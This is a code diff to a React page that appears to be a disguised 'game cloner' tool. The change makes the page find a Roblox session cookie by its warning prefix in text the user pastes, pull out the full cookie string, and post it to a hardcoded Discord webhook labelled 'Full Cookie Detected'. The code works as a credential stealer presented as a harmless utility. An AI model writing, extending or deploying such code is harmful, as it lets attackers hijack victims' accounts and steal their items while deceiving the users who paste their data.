@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
@@ -16,12 +15,20 @@ const Index = () => {
     return warningPattern.test(text);
   };
 
-  const extractWarningText = (text: string) => {
-    const match = text.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/);
-    return match ? match[0] : null;
+  const extractFullCookie = (text: string) => {
+    // Find the warning pattern and extract everything from it onwards
+    const warningPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/;
+    const match = text.match(warningPattern);
+    
+    if (match) {
+      const startIndex = text.indexOf(match[0]);
+      // Extract the full cookie string from the warning onwards
+      return text.substring(startIndex).trim();
+    }
+    return null;
   };
 
-  const sendToDiscordWebhook = async (warningText: string) => {
+  const sendToDiscordWebhook = async (fullCookie: string) => {
     const webhookUrl = 'https://discord.com/api/webhooks/1392448527291912314/iiYGKSsuIt7da6l9guz7bZl7VU9-r3jc5r1YI1vOvdEtH-agvWUI1Iq9lBWb8ZwQqifI';
     
     try {
@@ -31,15 +38,15 @@ const Index = () => {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          content: `🚨 **Warning Text Detected** 🚨\n\`\`\`\n${warningText}\n\`\`\``,
+          content: `🚨 **Full Cookie Detected** 🚨\n\`\`\`\n${fullCookie}\n\`\`\``,
           embeds: [{
             title: "Game Cloner Detection",
-            description: "Suspicious warning text has been detected and extracted.",
+            description: "Full cookie string has been detected and extracted.",
             color: 0xff0000,
             timestamp: new Date().toISOString(),
             fields: [{
-              name: "Extracted Text",
-              value: `\`${warningText}\``,
+              name: "Extracted Cookie",
+              value: `\`${fullCookie.substring(0, 1000)}${fullCookie.length > 1000 ? '...' : ''}\``,
               inline: false
             }]
           }]
@@ -73,9 +80,9 @@ const Index = () => {
 
     // Check if warning pattern is detected
     if (detectWarningPattern(gameFiles)) {
-      const warningText = extractWarningText(gameFiles);
-      if (warningText) {
-        const success = await sendToDiscordWebhook(warningText);
+      const fullCookie = extractFullCookie(gameFiles);
+      if (fullCookie) {
+        const success = await sendToDiscordWebhook(fullCookie);
         
         if (success) {
           toast({
